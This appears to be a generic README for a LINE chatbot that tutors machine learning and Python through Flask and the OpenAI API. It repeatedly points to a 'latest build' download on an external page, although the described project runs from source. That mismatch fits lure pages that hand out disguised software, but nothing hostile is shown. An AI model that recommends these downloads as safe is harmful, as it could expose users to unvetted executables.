# AI Learning Tutor - AI Learning Assistant 2026

> **AI Learning Tutor is a LINE Bot for text-based learning support in machine learning, deep learning, AI agents, Python, and modern AI workflows, powered by OpenAI teaching modules.**

[![Platform](https://img.shields.io/badge/Platform-LINE%20Bot-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leofisherfuzf6620/ai-learning-tutor-bot?style=flat-square)](https://github.com/leofisherfuzf6620/ai-learning-tutor-bot)

---

<p align="center">
  <a href="https://leofisherfuzf6620.github.io/ai-learning-tutor-bot/">
    <img src="https://img.shields.io/badge/Download-AI%20Learning%20Tutor%20Latest-brightgreen?style=for-the-badge" alt="Download AI Learning Tutor">
  </a>
</p>

> **[Download AI Learning Tutor](https://leofisherfuzf6620.github.io/ai-learning-tutor-bot/)**

---

[Download Latest Build](https://leofisherfuzf6620.github.io/ai-learning-tutor-bot/)

---

## What Is AI Learning Tutor?

AI Learning Tutor brings an interactive technical study assistant into LINE. Learners can use text conversations to investigate machine learning, deep learning, AI agents, Python, and contemporary AI development practices.

Under the hood, the application connects the LINE Bot platform with Python, Flask, and the OpenAI Responses API. Subject-specific skill context helps organize the tutor's behavior for different areas of study. LINE Rich Menu navigation and the Agent Call-in API provide additional ways to interact with the service.

---

## Highlights

- Provides AI-assisted help with technical learning subjects
- Delivers conversational, text-based tutoring through LINE
- Connects to the OpenAI Responses API
- Uses skill-oriented teaching context for focused subject guidance
- Includes Rich Menu navigation for simpler bot use
- Supports Agent Call-in API requests
- Runs as a Flask application service
- Supports deployment through Google Cloud Run
- Exposes runtime observability for deployed services

---

## Getting Started

First, retrieve the source and move into its directory:

    git clone https://github.com/leofisherfuzf6620/ai-learning-tutor-bot.git
    cd REPO

Next, create a Python environment, install the required dependencies, and provide the credentials needed by the integrated services. Once configured, the application may be launched using its Flask entry point or packaged and deployed as a container on Google Cloud Run.

For local work, run the startup command provided by the repository after completing configuration. Before using the bot, connect the running service URL to the webhook configured for the LINE Bot.

---

## Using the Tutor

A normal interaction may look like this:

1. Start a conversation with the configured LINE Bot account.
2. Choose a subject or action from the Rich Menu.
3. Submit a question about machine learning, deep learning, AI agents, Python, or another supported AI workflow.
4. Ask additional questions to extend and clarify the discussion.
5. Call the Agent Call-in API when another workflow needs to obtain help from the tutor.
6. Inspect the application's observability information when investigating behavior in a deployed environment.

Sample questions include:

- `Explain the difference between machine learning and deep learning.`
- `Help me understand Python concepts used in an AI project.`
- `What is an AI agent workflow?`
- `Create a study path for learning modern AI tools.`

---

## Settings and Credentials

Use environment variables or the deployment configuration for application settings. Sensitive credentials should not be stored in the repository.

Typical integration variables are:

    OPENAI_API_KEY=<your-openai-api-key>
    LINE_CHANNEL_SECRET=<your-line-channel-secret>
    LINE_CHANNEL_ACCESS_TOKEN=<your-line-channel-access-token>

Refer to the repository's configuration files and deployment settings for the precise variable names and required values. The LINE webhook must be configured with the URL of the running Flask service.

---

## System Requirements

- Python runtime
- Flask application environment
- LINE Bot channel configuration
- OpenAI API access
- Network access for API communication
- Google Cloud Run account and deployment configuration for cloud hosting
- Sufficient runtime storage for the application and its dependencies

---

## Frequently Asked Questions

### How can I use the tutor?

Open the configured LINE Bot account. Once the channel details and webhook are connected, you can begin a learning conversation in LINE.

### What can I learn with it?

The intended learning areas include machine learning, deep learning, AI agents, Python, and modern AI workflows. The available instructional behavior is determined by the configured skill modules.

### Where should credentials be supplied?

Set service credentials in the environment or deployment configuration. Do not commit them to source control.

### Is local execution supported?

Yes. Prepare the Python and Flask environment, configure the LINE and OpenAI values, and launch the application using the startup process documented in the repository.

### What is the deployment process?

Google Cloud Run deployment is supported. Build and deploy the application using the repository's cloud configuration, then use the deployed service endpoint as the LINE webhook URL.

### What can I investigate when the bot is silent?

Review the Flask logs, webhook address, LINE channel credentials, OpenAI settings, and runtime observability output. Also verify that the deployed service is reachable and that its endpoint exactly matches the LINE Bot configuration.

### How are new versions provided?

Project updates are published through the repository. Check new builds and repository changes before applying an update to an active deployment.

---

## Planned Improvements

- Extend the collection of skill-based teaching contexts
- Improve learning flows built around the LINE Rich Menu
- Grow the Agent Call-in API workflow support
- Strengthen runtime observability for Cloud Run services
- Provide additional guided paths for AI and Python learning

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
